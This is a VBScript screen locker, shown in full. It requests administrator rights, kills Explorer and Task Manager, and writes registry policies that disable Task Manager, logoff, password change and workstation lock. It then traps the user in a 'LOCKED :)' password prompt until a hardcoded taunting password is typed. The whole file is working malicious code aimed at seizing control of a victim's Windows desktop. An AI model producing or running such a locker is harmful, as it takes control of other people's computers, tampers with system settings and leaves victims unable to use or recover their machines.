Option Explicit
On Error Resume Next
RunAsAdmin()
Dim Objshell, Password, YourPass, objApp
Set Objshell = CreateObject("WScript.shell")
Set objApp = CreateObject("Shell.Application")
objApp.MinimizeAll
Objshell.Run "Taskkill /F /IM Explorer.exe /IM Taskmgr.exe",0
WScript.Sleep 500 
Objshell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD"
Objshell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogoff", 1, "REG_DWORD"
Objshell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableChangePassword", 1, "REG_DWORD"
Objshell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\shutdownwithoutlogon", 0, "REG_DWORD"
Objshell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableLockWorkstation", 1, "REG_DWORD"
Objshell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\LegalNoticeText", _
"	...You have not yet entered the correct password!...", "REG_SZ"
Objshell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\LegalNoticeCaption", "Screen Lock", "REG_SZ"
Sub Pass
	Password = InputBox("Please Enter Password:", "LOCKED :)")
	If Password = ("GoddessOliviaOwnsYoulol") Then
			Dim correct
			Correct = Msgbox("Correct Password!",64,"Correct")
			Objshell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 0, "REG_DWORD"
			Objshell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogoff", 0, "REG_DWORD"
			Objshell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableChangePassword", 0, "REG_DWORD"
			Objshell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\shutdownwithoutlogon", 1, "REG_DWORD"
			Objshell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableLockWorkstation", 0, "REG_DWORD"
			Objshell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\LegalNoticeText","", "REG_SZ"
			Objshell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\LegalNoticeCaption", "", "REG_SZ"
			Objshell.run "cmd /c explorer.exe",0
			objApp.UndoMinimizeALL
			WScript.Sleep 2000 : Objshell.Run "taskkill /f /im cmd.exe",0
			WScript.Quit
		Elseif IsEmpty(Password) Then
			Call Pass
		Else
			Dim Incorrect
			Incorrect = MsgBox("Incorrect Password! Please Try Again.",16,"LOCKED :)")
			Call pass
	End If
End Sub
Call Pass
Function RunAsAdmin()
	If WScript.Arguments.length = 0 Then
		CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & _
		WScript.ScriptFullName & """" & " RunAsAdministrator",,"runas", 1
		WScript.Quit
	End If
End Function